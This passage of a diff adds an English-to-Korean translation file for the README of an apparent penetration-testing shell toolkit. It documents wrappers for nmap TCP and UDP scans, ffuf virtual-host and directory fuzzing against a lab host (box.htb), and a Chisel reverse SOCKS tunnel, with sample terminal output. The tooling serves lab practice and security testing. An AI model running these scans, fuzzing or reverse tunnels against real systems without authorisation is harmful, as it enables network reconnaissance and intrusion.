+        "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+        "originContent": "Example: ",
+        "translatedContent": "예시:"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 32,
+    "Content": "```\n┌──(jazz㉿kali)-[~]\n└─$ nmap_default 127.0.0.1\n[i] Creating /home/jazz/nmap...\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:04 EDT\n...\n```",
+    "ContentSha": "GOG1WA6X1Nq2SeckjMWDyW3Iq9/3lNEJS3OEVGXqC+g=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n┌──(jazz㉿kali)-[~]\n└─$ nmap_default 127.0.0.1\n[i] Creating /home/jazz/nmap...\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:04 EDT\n...\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "ty/x6ZluZLABP4RO1uWEAPF20EpOg76E7Cx+tFfpg/c=",
+        "originContent": "┌──(jazz㉿kali)-[~]",
+        "translatedContent": "┌──(jazz㉿kali)-[~]"
+      },
+      {
+        "row": 3,
+        "rowsha": "xeQ4TkGmz5SD2r6YQ15fVxftNBmMsPqMo5V/lSkNigU=",
+        "originContent": "└─$ nmap_default 127.0.0.1",
+        "translatedContent": "└─$ nmap_default 127.0.0.1"
+      },
+      {
+        "row": 4,
+        "rowsha": "7S5urbuckRJHgwjNr7ibZgm4EPXIYnVrfTMTAAYY6dg=",
+        "originContent": "[i] Creating /home/jazz/nmap...",
+        "translatedContent": "[i] Creating /home/jazz/nmap..."
+      },
+      {
+        "row": 5,
+        "rowsha": "YlgQxwNXMjNqZCJZDefXxPzJ/4qIl7lXzEj8V0yZdbQ=",
+        "originContent": "Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:04 EDT",
+        "translatedContent": "Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:04 EDT"
+      },
+      {
+        "row": 6,
+        "rowsha": "q132Jbx229ThY77S3YiN+Cj5AVm7k1VlJcMYIbZUHUY=",
+        "originContent": "...",
+        "translatedContent": "..."
+      },
+      {
+        "row": 7,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 33,
+    "Content": "> #### Notes\n> - This only scans the default TCP ports. Add `-p-` as an argument to scan all ports.\n> - Uses `sudo` to get the privileges required for a SYN scan\n### > nmap_udp $ip (extra arguments)\nStarts an UDP nmap scan with my default settings and outputs the scan results to an nmap directory which is automatically created if it does not yet exist. \nExample: ",
+    "ContentSha": "bG950KuA+aMs2j+4/KsF8nppGyqt1jxeE5Y0fdppgAs=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "> #### 참고사항\n> - 기본 TCP 포트만 스캔합니다. 모든 포트를 스캔하려면 `-p-`를 인수로 추가하세요.\n> - SYN 스캔에 필요한 권한을 얻기 위해 `sudo`를 사용합니다.\n### > nmap_udp $ip (추가 인수)\n기본 설정으로 UDP nmap 스캔을 시작하며, 스캔 결과를 nmap 디렉터리에 출력합니다. 해당 디렉터리가 없으면 자동으로 생성됩니다. \n예시:",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+        "originContent": "> #### Notes",
+        "translatedContent": "> #### 참고사항"
+      },
+      {
+        "row": 2,
+        "rowsha": "fydNLOcYMjB3KI4OYf674KaNm3AgaZsxrNlykMIsr/Y=",
+        "originContent": "> - This only scans the default TCP ports. Add `-p-` as an argument to scan all ports.",
+        "translatedContent": "> - 기본 TCP 포트만 스캔합니다. 모든 포트를 스캔하려면 `-p-`를 인수로 추가하세요."
+      },
+      {
+        "row": 3,
+        "rowsha": "mZZJHLq8GpcoETtGDPi2BKlyKHzGgeaTqdl7q4oOUZU=",
+        "originContent": "> - Uses `sudo` to get the privileges required for a SYN scan",
+        "translatedContent": "> - SYN 스캔에 필요한 권한을 얻기 위해 `sudo`를 사용합니다."
+      },
+      {
+        "row": 4,
+        "rowsha": "RVDX7bWgTGtshrGhjg3/PIyJEWuMMx0FXcqIxoSiRLI=",
+        "originContent": "### > nmap_udp $ip (extra arguments)",
+        "translatedContent": "### > nmap_udp $ip (추가 인수)"
+      },
+      {
+        "row": 5,
+        "rowsha": "wRXi/n3gyvujaFaV2NTXt9ngzOwnyLvf56rKDmBHnwQ=",
+        "originContent": "Starts an UDP nmap scan with my default settings and outputs the scan results to an nmap directory which is automatically created if it does not yet exist. ",
+        "translatedContent": "기본 설정으로 UDP nmap 스캔을 시작하며, 스캔 결과를 nmap 디렉터리에 출력합니다. 해당 디렉터리가 없으면 자동으로 생성됩니다. "
+      },
+      {
+        "row": 6,
+        "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+        "originContent": "Example: ",
+        "translatedContent": "예시:"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 34,
+    "Content": "```\n┌──(jazz㉿kali)-[~]\n└─$ nmap_udp 127.0.0.1\n[i] Creating /home/jazz/nmap...\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:11 EDT\n...\n```",
+    "ContentSha": "ebPZgx2UnjUixQcAnjMjsaULMxszIt1vo12UY9uo42Q=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n┌──(jazz㉿kali)-[~]\n└─$ nmap_udp 127.0.0.1\n[i] Creating /home/jazz/nmap...\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:11 EDT\n...\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "ty/x6ZluZLABP4RO1uWEAPF20EpOg76E7Cx+tFfpg/c=",
+        "originContent": "┌──(jazz㉿kali)-[~]",
+        "translatedContent": "┌──(jazz㉿kali)-[~]"
+      },
+      {
+        "row": 3,
+        "rowsha": "ns70wTrrr6+L34RroarR3YEybQVHp/TjYVEsNOnFVhg=",
+        "originContent": "└─$ nmap_udp 127.0.0.1",
+        "translatedContent": "└─$ nmap_udp 127.0.0.1"
+      },
+      {
+        "row": 4,
+        "rowsha": "7S5urbuckRJHgwjNr7ibZgm4EPXIYnVrfTMTAAYY6dg=",
+        "originContent": "[i] Creating /home/jazz/nmap...",
+        "translatedContent": "[i] Creating /home/jazz/nmap..."
+      },
+      {
+        "row": 5,
+        "rowsha": "mDVUMPAtgI5wpBCHkcYyFp8BeLEoWFZ4LZ3YPd9rU/Q=",
+        "originContent": "Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:11 EDT",
+        "translatedContent": "Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:11 EDT"
+      },
+      {
+        "row": 6,
+        "rowsha": "q132Jbx229ThY77S3YiN+Cj5AVm7k1VlJcMYIbZUHUY=",
+        "originContent": "...",
+        "translatedContent": "..."
+      },
+      {
+        "row": 7,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 35,
+    "Content": "> #### Notes\n> - This only scans the default UDP ports. Add `-p-` as an argument to scan all ports.\n> - Uses `sudo` to get the privileges required for a UDP scan\n\n\n## SecLists Path\n\n> #### Notes\n> - Many of the functions in this toolkit use wordlists from the SecLists project. To ensure these functions work correctly, the scripts need to know where to find the SecLists directory. The toolkit uses the following logic to locate SecLists:\n\n1. First, it checks if `/opt/seclists/` exists.\n2. If not, it checks if `/usr/share/seclists/` exists.\n3. If neither of these directories exist, it looks for an environment variable called `SECLISTS_PATH`.\n\nTo set up SecLists for use with these scripts:\n\n1. Install SecLists in one of the standard locations (`/opt/seclists/` or `/usr/share/seclists/`).\n   \n   OR\n\n2. Set the `SECLISTS_PATH` environment variable to point to your SecLists installation:\n",
+    "ContentSha": "aG1Qlf45LpwIHB4q1bbV0jL4bzQ9rtPsoNErqlC4t+4=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "> #### 참고 사항\n> - 이것은 기본 UDP 포트만 스캔합니다. 모든 포트를 스캔하려면 `-p-`를 인수로 추가하세요.\n> - UDP 스캔에 필요한 권한을 얻기 위해 `sudo`를 사용합니다.\n\n\n## SecLists 경로\n\n> #### 참고 사항\n> - 이 툴킷의 많은 기능이 SecLists 프로젝트의 워드리스트를 사용합니다. 이 기능들이 올바르게 작동하려면 스크립트가 SecLists 디렉터리 위치를 알아야 합니다. 툴킷은 SecLists 위치를 찾기 위해 다음 논리를 사용합니다:\n\n1. 먼저 `/opt/seclists/`가 존재하는지 확인합니다.\n2. 없다면 `/usr/share/seclists/`가 존재하는지 확인합니다.\n3. 이 두 디렉터리 모두 없으면 `SECLISTS_PATH`라는 환경 변수를 찾습니다.\n\n이 스크립트와 함께 SecLists를 설정하려면:\n\n1. 표준 위치 중 하나(`/opt/seclists/` 또는 `/usr/share/seclists/`)에 SecLists를 설치합니다.\n   \n   또는\n\n2. `SECLISTS_PATH` 환경 변수를 SecLists 설치 경로로 설정합니다:\n",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+        "originContent": "> #### Notes",
+        "translatedContent": "> #### 참고 사항"
+      },
+      {
+        "row": 2,
+        "rowsha": "mp5ajbHjdpat4mC0MrYSjl5ZaNBYawX+Ygc5cCXMwZQ=",
+        "originContent": "> - This only scans the default UDP ports. Add `-p-` as an argument to scan all ports.",
+        "translatedContent": "> - 이것은 기본 UDP 포트만 스캔합니다. 모든 포트를 스캔하려면 `-p-`를 인수로 추가하세요."
+      },
+      {
+        "row": 3,
+        "rowsha": "as9c8NdYtF0rBg8DSRt2/YakNKtm/pre6hqmlFy5R5Q=",
+        "originContent": "> - Uses `sudo` to get the privileges required for a UDP scan",
+        "translatedContent": "> - UDP 스캔에 필요한 권한을 얻기 위해 `sudo`를 사용합니다."
+      },
+      {
+        "row": 4,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 5,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 6,
+        "rowsha": "rk3AUzWNDRlAUlGt+6mfRtt861GbhRh6I8riIvPydhU=",
+        "originContent": "## SecLists Path",
+        "translatedContent": "## SecLists 경로"
+      },
+      {
+        "row": 7,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 8,
+        "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+        "originContent": "> #### Notes",
+        "translatedContent": "> #### 참고 사항"
+      },
+      {
+        "row": 9,
+        "rowsha": "IXUb9LCKh4WdPnFsONXnRnj/Swc1kbHzY85buzLkuEE=",
+        "originContent": "> - Many of the functions in this toolkit use wordlists from the SecLists project. To ensure these functions work correctly, the scripts need to know where to find the SecLists directory. The toolkit uses the following logic to locate SecLists:",
+        "translatedContent": "> - 이 툴킷의 많은 기능이 SecLists 프로젝트의 워드리스트를 사용합니다. 이 기능들이 올바르게 작동하려면 스크립트가 SecLists 디렉터리 위치를 알아야 합니다. 툴킷은 SecLists 위치를 찾기 위해 다음 논리를 사용합니다:"
+      },
+      {
+        "row": 10,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 11,
+        "rowsha": "HsMx1PGdqmKld4NFWDdg4xOYy7gtrlyhWIsobAmQsY4=",
+        "originContent": "1. First, it checks if `/opt/seclists/` exists.",
+        "translatedContent": "1. 먼저 `/opt/seclists/`가 존재하는지 확인합니다."
+      },
+      {
+        "row": 12,
+        "rowsha": "QQG44hfccZjXddXcSTUF+FVQLeBoepF5uiOII0qhTok=",
+        "originContent": "2. If not, it checks if `/usr/share/seclists/` exists.",
+        "translatedContent": "2. 없다면 `/usr/share/seclists/`가 존재하는지 확인합니다."
+      },
+      {
+        "row": 13,
+        "rowsha": "N85sMUEyFMjuWjy6J0PuOG3gDPhtGnRksjrrTsGZ1M8=",
+        "originContent": "3. If neither of these directories exist, it looks for an environment variable called `SECLISTS_PATH`.",
+        "translatedContent": "3. 이 두 디렉터리 모두 없으면 `SECLISTS_PATH`라는 환경 변수를 찾습니다."
+      },
+      {
+        "row": 14,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 15,
+        "rowsha": "EBgLno/PFF5fZzJe0i1RdVgzxklyYYwWiSN/oLqqnzc=",
+        "originContent": "To set up SecLists for use with these scripts:",
+        "translatedContent": "이 스크립트와 함께 SecLists를 설정하려면:"
+      },
+      {
+        "row": 16,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 17,
+        "rowsha": "xC/lp/terTnw0BwiUwuQilUujUV1FoPXLpZ66ReMZOo=",
+        "originContent": "1. Install SecLists in one of the standard locations (`/opt/seclists/` or `/usr/share/seclists/`).",
+        "translatedContent": "1. 표준 위치 중 하나(`/opt/seclists/` 또는 `/usr/share/seclists/`)에 SecLists를 설치합니다."
+      },
+      {
+        "row": 18,
+        "rowsha": "Cq19p30u1Zw5bJmnTknzpFJNzby1FjJRsUM9ZAJHrrQ=",
+        "originContent": "   ",
+        "translatedContent": "   "
+      },
+      {
+        "row": 19,
+        "rowsha": "AZDjvRDDgrzBNT8Ec8XRIXmvJqkx2Zw6yIxkCnnbYHA=",
+        "originContent": "   OR",
+        "translatedContent": "   또는"
+      },
+      {
+        "row": 20,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 21,
+        "rowsha": "mkVJiIKAfm8k7nvADqo7HtUTevRsvw8+Q0UvMiw59C4=",
+        "originContent": "2. Set the `SECLISTS_PATH` environment variable to point to your SecLists installation:",
+        "translatedContent": "2. `SECLISTS_PATH` 환경 변수를 SecLists 설치 경로로 설정합니다:"
+      },
+      {
+        "row": 22,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 36,
+    "Content": "   ```bash\n   export SECLISTS_PATH=\"/path/to/seclists\"\n   # You can add this line to your .zshrc file to make it permanent.\n    ```",
+    "ContentSha": "iJ+qL3QbysDXXR8kaGksNSp7S+hkqtaWIwO4mBursCo=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "   ```bash\n   export SECLISTS_PATH=\"/path/to/seclists\"\n   # You can add this line to your .zshrc file to make it permanent.\n    ```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "RRH6MrA4etNIHujwLv0rliGxya+NbpNSoC32JfHakN0=",
+        "originContent": "   ```bash",
+        "translatedContent": "   ```bash"
+      },
+      {
+        "row": 2,
+        "rowsha": "k6oad1YlpolwSHaJY5EOPxXhzFX1Z2LW0FLqrXUB8CU=",
+        "originContent": "   export SECLISTS_PATH=\"/path/to/seclists\"",
+        "translatedContent": "   export SECLISTS_PATH=\"/path/to/seclists\""
+      },
+      {
+        "row": 3,
+        "rowsha": "D66mMmB1qW7vXqQpdCgVdyKw+Pn0S/9n8CLlsRTtAmk=",
+        "originContent": "   # You can add this line to your .zshrc file to make it permanent.",
+        "translatedContent": "   # You can add this line to your .zshrc file to make it permanent."
+      },
+      {
+        "row": 4,
+        "rowsha": "7em5kHTNO1cPWnaxB4H1GFdKMaKdWtteFc09etZSl0o=",
+        "originContent": "    ```",
+        "translatedContent": "    ```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 37,
+    "Content": "\n## Web Fuzzing\n### > vhost $domain (-w wordlist) (extra arguments)\nPerforms virtual host discovery using ffuf.\nExample:",
+    "ContentSha": "K2Kcdz/ZUAA7wXN/P3ecRoE+UK93gAsm8RLgRKb6v6k=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "\n## 웹 퍼징\n### > vhost $domain (-w 단어목록) (추가 인자)\nffuf를 사용하여 가상 호스트 탐색을 수행합니다.\n예시:",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 2,
+        "rowsha": "RN2FdoJV1hFlGjnjtZUKinLa/Dzym07GSolTNCKGJyI=",
+        "originContent": "## Web Fuzzing",
+        "translatedContent": "## 웹 퍼징"
+      },
+      {
+        "row": 3,
+        "rowsha": "Lexj5JJgV9E2mZnbXfCn0roRwqstPLyuFORT2UOtd6U=",
+        "originContent": "### > vhost $domain (-w wordlist) (extra arguments)",
+        "translatedContent": "### > vhost $domain (-w 단어목록) (추가 인자)"
+      },
+      {
+        "row": 4,
+        "rowsha": "KYh58TeqKn9HNbDIK2GewRHEA2Sanh7NUOKAfDElctw=",
+        "originContent": "Performs virtual host discovery using ffuf.",
+        "translatedContent": "ffuf를 사용하여 가상 호스트 탐색을 수행합니다."
+      },
+      {
+        "row": 5,
+        "rowsha": "hyiH5WPnWVf/wgsCEzJQTy3dCo85ZMuTBwhjv68Tza0=",
+        "originContent": "Example:",
+        "translatedContent": "예시:"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 38,
+    "Content": "```\n┌──(22sh㉿kali)-[~]\n└─$ vhost box.htb\n```",
+    "ContentSha": "p7KTa5XBcTSuUNA3JBIIICqNWmv0UxU5F52boUKZOw0=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n┌──(22sh㉿kali)-[~]\n└─$ vhost box.htb\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "Gqsss73jUsRJ1WbEdwazg3mHJxXEF45T35iQ5yYvGys=",
+        "originContent": "┌──(22sh㉿kali)-[~]",
+        "translatedContent": "┌──(22sh㉿kali)-[~]"
+      },
+      {
+        "row": 3,
+        "rowsha": "pqujVXxQKTWpksERQIZ/77Ll97w/1qxYxE4+t5JAFm8=",
+        "originContent": "└─$ vhost box.htb",
+        "translatedContent": "└─$ vhost box.htb"
+      },
+      {
+        "row": 4,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 39,
+    "Content": "> #### Notes\n> - When passing just the domain http will be used, you can however also pass in the full url https://box.htb for https\n> - Requires `ffuf` to be installed\n### > fuzz_dir $url (extra arguments)\nPerforms directory and files fuzzing using ffuf.\nExemple:",
+    "ContentSha": "P4f+hnFn2YgcyBKIE0OpvaBhJeQtcMU+TVPS+yVuk04=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "> #### 노트\n> - 도메인만 전달하면 http가 사용되며, https를 위해 전체 URL https://box.htb도 전달할 수 있습니다.\n> - `ffuf`가 설치되어 있어야 합니다.\n### > fuzz_dir $url (추가 인수)\nffuf를 사용하여 디렉토리 및 파일 퍼징을 수행합니다.\n예제:",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+        "originContent": "> #### Notes",
+        "translatedContent": "> #### 노트"
+      },
+      {
+        "row": 2,
+        "rowsha": "NSoZs/2wy4hnlDu+/vr9kMU6sy+FvebqB94s1hLUljM=",
+        "originContent": "> - When passing just the domain http will be used, you can however also pass in the full url https://box.htb for https",
+        "translatedContent": "> - 도메인만 전달하면 http가 사용되며, https를 위해 전체 URL https://box.htb도 전달할 수 있습니다."
+      },
+      {
+        "row": 3,
+        "rowsha": "nD3bjrXKOYCHNqcx8TqHofqhpclwImQZsNQQDCgKbr4=",
+        "originContent": "> - Requires `ffuf` to be installed",
+        "translatedContent": "> - `ffuf`가 설치되어 있어야 합니다."
+      },
+      {
+        "row": 4,
+        "rowsha": "4y/oW/6JSsrU+muOM5zDzEzOHQNcFoMCen20lBcilNs=",
+        "originContent": "### > fuzz_dir $url (extra arguments)",
+        "translatedContent": "### > fuzz_dir $url (추가 인수)"
+      },
+      {
+        "row": 5,
+        "rowsha": "f3kE8PFJLPZ05PV8XgnMD8k+0tALGALIBxhR45HRPHQ=",
+        "originContent": "Performs directory and files fuzzing using ffuf.",
+        "translatedContent": "ffuf를 사용하여 디렉토리 및 파일 퍼징을 수행합니다."
+      },
+      {
+        "row": 6,
+        "rowsha": "oyIm+8pBA3n0/a+g6O/BxUqOBzEDhZyNT5DnVw2GsXw=",
+        "originContent": "Exemple:",
+        "translatedContent": "예제:"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 40,
+    "Content": "```\n┌──(22sh㉿kali)-[~]\n└─$ fuzz_dir http://box.htb\n\n┌──(22sh㉿kali)-[~]\n└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt\n\n┌──(22sh㉿kali)-[~]\n└─$ fuzz_dir http://box.htb -fs 245\n\n┌──(22sh㉿kali)-[~]\n└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt -fs 245\n```",
+    "ContentSha": "N84ojMggdrE9EfOClybb/hfQQuvqPg4oPvRwM9aOuAI=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n┌──(22sh㉿kali)-[~]\n└─$ fuzz_dir http://box.htb\n\n┌──(22sh㉿kali)-[~]\n└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt\n\n┌──(22sh㉿kali)-[~]\n└─$ fuzz_dir http://box.htb -fs 245\n\n┌──(22sh㉿kali)-[~]\n└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt -fs 245\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "Gqsss73jUsRJ1WbEdwazg3mHJxXEF45T35iQ5yYvGys=",
+        "originContent": "┌──(22sh㉿kali)-[~]",
+        "translatedContent": "┌──(22sh㉿kali)-[~]"
+      },
+      {
+        "row": 3,
+        "rowsha": "Kwt1GtsMoPJXMiWdtpm0zulzCX2geXpXhZb/RFHPbPo=",
+        "originContent": "└─$ fuzz_dir http://box.htb",
+        "translatedContent": "└─$ fuzz_dir http://box.htb"
+      },
+      {
+        "row": 4,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 5,
+        "rowsha": "Gqsss73jUsRJ1WbEdwazg3mHJxXEF45T35iQ5yYvGys=",
+        "originContent": "┌──(22sh㉿kali)-[~]",
+        "translatedContent": "┌──(22sh㉿kali)-[~]"
+      },
+      {
+        "row": 6,
+        "rowsha": "s5nNoRAk4zYBJi9Wr8rYtzJD8JjGpdScW6hnOTiSMxc=",
+        "originContent": "└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt",
+        "translatedContent": "└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt"
+      },
+      {
+        "row": 7,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 8,
+        "rowsha": "Gqsss73jUsRJ1WbEdwazg3mHJxXEF45T35iQ5yYvGys=",
+        "originContent": "┌──(22sh㉿kali)-[~]",
+        "translatedContent": "┌──(22sh㉿kali)-[~]"
+      },
+      {
+        "row": 9,
+        "rowsha": "YfOZW+5C7JqJSWzZgV9DszDfyp++HD3jwlMxvc7RQ64=",
+        "originContent": "└─$ fuzz_dir http://box.htb -fs 245",
+        "translatedContent": "└─$ fuzz_dir http://box.htb -fs 245"
+      },
+      {
+        "row": 10,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 11,
+        "rowsha": "Gqsss73jUsRJ1WbEdwazg3mHJxXEF45T35iQ5yYvGys=",
+        "originContent": "┌──(22sh㉿kali)-[~]",
+        "translatedContent": "┌──(22sh㉿kali)-[~]"
+      },
+      {
+        "row": 12,
+        "rowsha": "0AKAinB/gUQsnqknV7hEFgs6QO8kB49s3hxWIiSv0Zg=",
+        "originContent": "└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt -fs 245",
+        "translatedContent": "└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt -fs 245"
+      },
+      {
+        "row": 13,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 41,
+    "Content": "> #### Notes\n> - Requires `ffuf` to be installed\n## Chisel Tunneling\n### > chisel_socks $ip $port\nSets up a SOCKS proxy using Chisel and copy the command to the clipboard.\nExample:\n",
+    "ContentSha": "E+uSb68ki3npUZpOL7LIuuLF4HtHcN/3i3jslAy7EJc=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "> #### 노트\n> - `ffuf`가 설치되어 있어야 합니다\n## Chisel 터널링\n### > chisel_socks $ip $port\nChisel을 사용하여 SOCKS 프록시를 설정하고 명령어를 클립보드에 복사합니다.\n예시:\n",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+        "originContent": "> #### Notes",
+        "translatedContent": "> #### 노트"
+      },
+      {
+        "row": 2,
+        "rowsha": "nD3bjrXKOYCHNqcx8TqHofqhpclwImQZsNQQDCgKbr4=",
+        "originContent": "> - Requires `ffuf` to be installed",
+        "translatedContent": "> - `ffuf`가 설치되어 있어야 합니다"
+      },
+      {
+        "row": 3,
+        "rowsha": "7S3KkJ9ArfkDKQ6E7BcKfgFZeGifwylI2ZcA0xoUu8k=",
+        "originContent": "## Chisel Tunneling",
+        "translatedContent": "## Chisel 터널링"
+      },
+      {
+        "row": 4,
+        "rowsha": "uIcIszvsf2PnjrNpBWntn+Dbwr8zC2S0qyl6A5eYqNI=",
+        "originContent": "### > chisel_socks $ip $port",
+        "translatedContent": "### > chisel_socks $ip $port"
+      },
+      {
+        "row": 5,
+        "rowsha": "1mge57UFQkJQ/ENb+IaW0NzE2QD/HjD3YYbIbAVXtWo=",
+        "originContent": "Sets up a SOCKS proxy using Chisel and copy the command to the clipboard.",
+        "translatedContent": "Chisel을 사용하여 SOCKS 프록시를 설정하고 명령어를 클립보드에 복사합니다."
+      },
+      {
+        "row": 6,
+        "rowsha": "hyiH5WPnWVf/wgsCEzJQTy3dCo85ZMuTBwhjv68Tza0=",
+        "originContent": "Example:",
+        "translatedContent": "예시:"
+      },
+      {
+        "row": 7,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 42,
+    "Content": "```\n┌──(22sh㉿kali)-[~/jazz]\n└─$ chisel_socks 10.10.14.10 8888\n[+] copied chisel client -v 10.10.14.10:8888 R:socks in clipboard\n2024/08/05 23:31:03 server: Reverse tunnelling enabled\n2024/08/05 23:31:03 server: Fingerprint vasHkxo+4Ec2ahPgyQ8BNqQVXOCda9cmPmP7WXRdh44=\n2024/08/05 23:31:03 server: Listening on http://0.0.0.0:8888\n```",
+    "ContentSha": "kR1Hp2txZGz0U1iB70hbu9XD4Nun6d4YnMAFKT6GVb0=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
